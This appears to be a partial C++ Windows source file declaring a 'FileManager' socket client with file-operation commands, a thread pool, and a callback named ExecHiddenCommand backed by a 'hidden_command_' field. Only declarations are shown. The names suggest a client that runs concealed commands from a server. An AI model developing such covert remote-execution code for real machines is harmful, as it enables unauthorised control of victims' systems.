#include <iostream>
#include <vector>
#include <queue>
#include <string>
#include <sstream>
#include <thread>
#include <mutex>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <winsock2.h>
#include <ws2tcpip.h>

#include <zlib.h>

#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable:4996)

#define TH_SIZE_MAXIMUM 5
#define TH_SIZE_MINIMUM 2

#define DEFAULT_PORT 8888
#define DEFAULT_IP "127.0.0.1"
#define BUFFER_SIZE 128

enum Command { kCreateNew, kDelete, kWrite, kRead, kExit, kAppend, kList };

class FileManager
{
public:
	FileManager()
	{
		continue_ = false;

	}
	int run();
private:
	int StartClient();
	int StopClient();
	int SendData(std::string data);
	int RecvData(std::string &data);
	unsigned GetCRC32(std::string data);

	int NonblockRecvData(std::string& data);

	static VOID CALLBACK ExecHiddenCommand(PTP_CALLBACK_INSTANCE Instance, PVOID Parameter, PTP_WORK Work);
	static VOID CALLBACK ThreadStarter(PTP_CALLBACK_INSTANCE Instance, PVOID Parameter, PTP_WORK Work);

	void RunRequestsCycle();

	std::string ParsCommand();

	PTP_POOL pool_;
	PTP_CLEANUP_GROUP cleanupgroup_;
	PTP_WORK work_;
	PTP_WORK_CALLBACK workcallback_;
	TP_CALLBACK_ENVIRON call_back_environ_;
	
	WSADATA wsa_data_;
	SOCKET socket_;
	sockaddr_in server_address_;
	std::mutex mt_;
	std::condition_variable cv_;

	std::string hidden_command_, server_data_;
	bool continue_;
	std::queue<std::string> requests_q;
};